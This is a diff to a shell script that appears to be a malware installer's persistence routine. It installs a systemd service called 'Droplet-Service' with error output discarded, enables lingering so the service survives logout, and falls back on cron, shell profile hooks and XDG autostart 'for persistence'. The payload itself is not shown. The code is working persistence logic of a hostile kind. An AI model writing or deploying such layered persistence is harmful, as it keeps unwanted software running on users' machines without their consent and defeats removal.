@@ -139,7 +139,9 @@ EOF
         systemctl enable "${SERVICE_NAME}"
         systemctl start "${SERVICE_NAME}" || true
     else
-        cat > "$SERVICE_PATH" <<EOF
+        # Check if systemd user session is available
+        if systemctl --user status >/dev/null 2>&1; then
+            cat > "$SERVICE_PATH" <<EOF
 [Unit]
 Description=Droplet-Service
 
@@ -154,19 +156,22 @@ StandardError=null
 [Install]
 WantedBy=default.target
 EOF
-        chmod 644 "$SERVICE_PATH"
-        systemctl --user daemon-reload
-        systemctl --user enable "${SERVICE_NAME}"
-        systemctl --user start "${SERVICE_NAME}" || true
+            chmod 644 "$SERVICE_PATH"
+            systemctl --user daemon-reload 2>/dev/null || true
+            systemctl --user enable "${SERVICE_NAME}" 2>/dev/null || true
+            systemctl --user start "${SERVICE_NAME}" 2>/dev/null || true
 
-        # Enable lingering so user services survive logout
-        if command -v loginctl &>/dev/null; then
-            loginctl enable-linger "$(whoami)" 2>/dev/null || true
-            echo "[+] Linger enabled for $(whoami)"
+            # Enable lingering so user services survive logout
+            if command -v loginctl &>/dev/null; then
+                loginctl enable-linger "$(whoami)" 2>/dev/null || true
+                echo "[+] Linger enabled for $(whoami)"
+            fi
+            echo "[+] Systemd user service installed"
+        else
+            echo "[!] Systemd user session not available - skipping systemd service"
+            echo "[*] Will rely on cron, profile hooks, and XDG autostart for persistence"
         fi
     fi
-
-    echo "[+] Systemd service installed and started"
 }
 
 # ─── Cron persistence (backup method) ───
